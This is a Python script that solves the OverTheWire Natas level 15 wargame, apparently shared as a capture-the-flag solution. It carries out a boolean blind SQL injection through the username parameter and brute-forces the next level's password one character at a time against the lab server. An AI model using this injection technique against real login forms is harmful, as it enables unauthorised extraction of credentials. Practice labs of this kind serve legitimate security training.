import requests
import string
import sys

valid_chars = string.digits + string.ascii_letters
auth_pass = sys.argv[1]
password = ""
i = 0
while len(password) < 32:
    for ch in valid_chars:
        payload = {'username':f'natas16" AND BINARY password LIKE \'{password}{ch}%\' #'}
        response = requests.post(
            'http://natas15.natas.labs.overthewire.org/index.php', 
            auth=('natas15', auth_pass),
            params=payload
        )
        if 'This user exists.' in response.text:
            password += ch
            print(f"Found: {ch}, password is - {password}")
            break

print(f"Finish! the password is {password}")
